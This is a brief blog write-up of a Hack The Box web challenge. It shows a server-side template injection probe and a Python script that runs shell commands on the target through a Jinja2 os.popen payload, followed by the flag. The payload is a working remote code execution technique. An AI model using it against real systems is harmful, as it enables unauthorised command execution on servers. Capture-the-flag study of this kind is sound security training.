---
layout: single
title: Template [Web] - Hack The Box
excerpt: "ECSC Prep"
date: 2021-12-21
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Web Challenge
tags:  
  - SSTI Injection
---

## Injection [SSTI]
`http://138.68.174.27:31035/{{1+1}}` => The page '2' could not be found

## Exploit
```python
import requests


def inject(cmd):
	HOST="http://138.68.174.27:31035/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('"+str(cmd)+"').read()%7D%7D"
	return HOST


while 1:
	cmd=input("> ")
	if cmd=="exit":
		break
	r = requests.get(inject(cmd))
	print(r.text)
```

### Flag => HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}
